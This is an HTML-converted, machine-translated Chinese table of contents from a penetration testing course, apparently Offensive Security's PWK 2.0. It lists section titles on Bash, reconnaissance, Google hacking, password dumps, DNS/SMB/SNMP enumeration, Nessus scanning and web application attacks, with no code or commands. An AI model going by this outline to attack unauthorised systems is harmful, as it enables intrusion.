<div style="position:absolute;top:6995;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 108</font></font></nobr></div>
<div style="position:absolute;top:7022;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.2.2</font></font></nobr></div>
<div style="position:absolute;top:7022;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读取用户输入 ..................................... ………………………………………………………………………………………………………………………………………………………… ..... 109</font></font></nobr></div>
<div style="position:absolute;top:7049;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.3</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7049;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If, Else, Elif 语句 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 110</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7076;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.4</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7076;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">布尔逻辑运算 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 113</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7102;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.5</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7102;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................................... 115</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7129;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.5.1</font></font></nobr></div>
<div style="position:absolute;top:7129;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">For 循环 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 115</font></font></nobr></div>
<div style="position:absolute;top:7156;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.5.2</font></font></nobr></div>
<div style="position:absolute;top:7156;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">While 循环 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 117 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:7303;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="7"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 7 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:7336;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:8413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:8413;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:8413;left:804"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7432;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.6</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7432;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">职能 ................................................. ………………………………………………………………………………………………………………………………………………………… ................................................... 118</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7459;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.7</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7459;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际例子 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 121</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7485;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.7.1</font></font></nobr></div>
<div style="position:absolute;top:7485;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际 Bash 用法 - 示例 1 ..................................... ...................................................... 121</font></font></nobr></div>
<div style="position:absolute;top:7512;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.7.2</font></font></nobr></div>
<div style="position:absolute;top:7512;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际 Bash 用法 - 示例 2 ..................................... ...................................................... 125</font></font></nobr></div>
<div style="position:absolute;top:7539;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.7.3</font></font></nobr></div>
<div style="position:absolute;top:7539;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实际 Bash 用法 - 示例 3 ..................................... ...................................................... 129</font></font></nobr></div>
<div style="position:absolute;top:7566;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.8</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7566;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包起来 ................................................ ………………………………………………………………………………………………………………………………………………………… ...................................... 133</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被动信息收集 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...... 134</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7620;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.1</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7620;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记笔记 ................................................ …………………………………………………………………………………………………………………………………………………………………… ...................................... 135</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7646;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.2</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7646;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网站侦查 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 136</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7673;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.3</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7673;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Whois 枚举 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 138</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7700;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.4</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7700;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">谷歌黑客 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 140</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7727;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.5</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7727;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络技术 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 145</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7754;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.6</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7754;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重组 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 148</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7781;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.7</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7781;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开源代码 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 154</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7808;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.8</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7808;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Shodan ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................................... 158</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7834;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.9</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7834;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全标头扫描器 ..................................... ………………………………………………………………………………………………………………………………………………………… ........ 161</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7861;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.10 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSL 服务器测试 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 162</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7888;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.11 </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pastebin ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 163</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7915;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.12</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户信息收集 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...... 164</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:7942;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.12.1 电子邮件收集 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 165</font></font></nobr></div>
<div style="position:absolute;top:7969;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.12.2 密码转储 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 166</font></font></nobr></div>
<div style="position:absolute;top:7995;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.13</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">社交媒体工具 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 166</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8022;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.13.2 站点特定工具 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 167</font></font></nobr></div>
<div style="position:absolute;top:8049;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.14</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">堆栈溢出 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 168</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8076;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.15</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息收集框架 ..................................... ...................................................... 168</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8103;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.15.1 开源情报框架 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 168</font></font></nobr></div>
<div style="position:absolute;top:8129;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.15.2 Maltego ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 169</font></font></nobr></div>
<div style="position:absolute;top:8156;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.16</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总结 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 170</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主动信息收集 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 171</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8210;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8210;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNS 枚举 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 171</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8237;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.1</font></font></nobr></div>
<div style="position:absolute;top:8237;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 DNS 服务器交互 ..................................... ...................................................... 172</font></font></nobr></div>
<div style="position:absolute;top:8264;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.2</font></font></nobr></div>
<div style="position:absolute;top:8264;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动查找 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 172</font></font></nobr></div>
<div style="position:absolute;top:8290;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.3</font></font></nobr></div>
<div style="position:absolute;top:8290;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">前向查找蛮力 ..................................... ...................................................... 173</font></font></nobr></div>
<div style="position:absolute;top:8317;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.4</font></font></nobr></div>
<div style="position:absolute;top:8317;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向查找蛮力 ..................................... ...................................................... 174</font></font></nobr></div>
<div style="position:absolute;top:8344;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.5</font></font></nobr></div>
<div style="position:absolute;top:8344;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNS 区域传输 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 174 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:8491;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="8"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 8 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:8524;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:9601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:9601;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:9601;left:804"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8620;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.6</font></font></nobr></div>
<div style="position:absolute;top:8620;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 中的相关工具 ..................................... ...................................................... 177</font></font></nobr></div>
<div style="position:absolute;top:8647;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8647;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口扫描 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................................... 180</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8673;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.1</font></font></nobr></div>
<div style="position:absolute;top:8673;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP / UDP 扫描 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...... 180</font></font></nobr></div>
<div style="position:absolute;top:8700;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2</font></font></nobr></div>
<div style="position:absolute;top:8700;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Nmap 进行端口扫描 ..................................... …………………………………………………………………………………………………………………………………………………………………… 182</font></font></nobr></div>
<div style="position:absolute;top:8727;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.3</font></font></nobr></div>
<div style="position:absolute;top:8727;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">马斯坎 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 193</font></font></nobr></div>
<div style="position:absolute;top:8754;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.3</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8754;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMB 枚举 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 194</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8781;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.3.1</font></font></nobr></div>
<div style="position:absolute;top:8781;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描 NetBIOS 服务 ..................................... ...................................... 195</font></font></nobr></div>
<div style="position:absolute;top:8808;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.3.2</font></font></nobr></div>
<div style="position:absolute;top:8808;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap SMB NSE 脚本 ..................................... …………………………………………………………………………………………………………………………………………………………………… ... 195</font></font></nobr></div>
<div style="position:absolute;top:8834;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.4</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8834;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NFS 枚举 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 197</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8861;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.4.1</font></font></nobr></div>
<div style="position:absolute;top:8861;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描 NFS 共享 ..................................... ………………………………………………………………………………………………………………………………………………………… . 197</font></font></nobr></div>
<div style="position:absolute;top:8888;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.4.2</font></font></nobr></div>
<div style="position:absolute;top:8888;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap NFS NSE 脚本 ..................................... …………………………………………………………………………………………………………………………………………………………………… .... 198</font></font></nobr></div>
<div style="position:absolute;top:8915;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.5</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8915;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMTP 枚举 ..................................... ………………………………………………………………………………………………………………………………………………………… ...................... 200</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8942;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8942;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SNMP 枚举 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 201</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:8969;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.1</font></font></nobr></div>
<div style="position:absolute;top:8969;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SNMP MIB 树 ..................................... ………………………………………………………………………………………………………………………………………………………… ...... 202</font></font></nobr></div>
<div style="position:absolute;top:8996;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.2</font></font></nobr></div>
<div style="position:absolute;top:8996;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描 SNMP ..................................... …………………………………………………………………………………………………………………………………………………………………… ……………… 203</font></font></nobr></div>
<div style="position:absolute;top:9022;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.3</font></font></nobr></div>
<div style="position:absolute;top:9022;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows SNMP 枚举示例 ..................................... ...................................... 204</font></font></nobr></div>
<div style="position:absolute;top:9049;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.7</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9049;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包起来 ................................................ …………………………………………………………………………………………………………………………………………………………………… ...................................... 205</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.</font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞扫描 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................................... 206</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9103;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9103;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞扫描概述和注意事项 ..................................................... ……………… 206</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9130;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1.1</font></font></nobr></div>
<div style="position:absolute;top:9130;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞扫描器的工作原理 ..................................... ...................................................... 206</font></font></nobr></div>
<div style="position:absolute;top:9157;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1.2</font></font></nobr></div>
<div style="position:absolute;top:9157;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动与自动扫描 ..................................... ...................................... 207</font></font></nobr></div>
<div style="position:absolute;top:9183;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1.3</font></font></nobr></div>
<div style="position:absolute;top:9183;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Internet 扫描与内部扫描 ............................................................ ...................................... 208</font></font></nobr></div>
<div style="position:absolute;top:9210;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1.4</font></font></nobr></div>
<div style="position:absolute;top:9210;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经过身份验证与未经身份验证的扫描 ........................................................................... ...................... 209</font></font></nobr></div>
<div style="position:absolute;top:9237;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9237;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Nessus 进行漏洞扫描 ..................................... ...................................................... 209</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9264;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.1</font></font></nobr></div>
<div style="position:absolute;top:9264;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装 Nessus ..................................... ………………………………………………………………………………………………………………………………………………………… ……………… 210</font></font></nobr></div>
<div style="position:absolute;top:9291;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.2</font></font></nobr></div>
<div style="position:absolute;top:9291;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义目标 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 215</font></font></nobr></div>
<div style="position:absolute;top:9317;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.3</font></font></nobr></div>
<div style="position:absolute;top:9317;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置扫描定义 ..................................... ...................................................... 218</font></font></nobr></div>
<div style="position:absolute;top:9344;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.4</font></font></nobr></div>
<div style="position:absolute;top:9344;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Nessus 进行未经身份验证的扫描 ..................................... ...................... 222</font></font></nobr></div>
<div style="position:absolute;top:9371;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.5</font></font></nobr></div>
<div style="position:absolute;top:9371;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Nessus 进行身份验证扫描 ..................................... ...................................... 226</font></font></nobr></div>
<div style="position:absolute;top:9398;left:142"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.6</font></font></nobr></div>
<div style="position:absolute;top:9398;left:217"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用单独的 Nessus 插件进行扫描 ..................................... ...................... 230</font></font></nobr></div>
<div style="position:absolute;top:9425;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.3</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9425;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Nmap 进行漏洞扫描 ..................................... ...................................................... 236</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9452;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.4</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9452;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包起来 ................................................ ………………………………………………………………………………………………………………………………………………………… ...................................... 239</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9. </font></font><font style="font-size:16px">	 </font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序攻击 ..................................... …………………………………………………………………………………………………………………………………………………………………… ...................... 240</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9505;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.1</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9505;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序评估方法...................................................... ...................... 240</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9532;left:127"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.2</font></font><font style="font-size:16px">	</font></nobr></div>
<div style="position:absolute;top:9532;left:181"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序枚举 ..................................... ………………………………………………………………………………………………………………………………………………………… . 240</font></font><font style="font-size:16px">	</font></nobr></div>
</span></font>

<div style="position:absolute;top:9679;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="9"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 9 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:9712;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:10789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:10789;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:10789;left:804"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9</font></font></nobr></div>
</span></font>
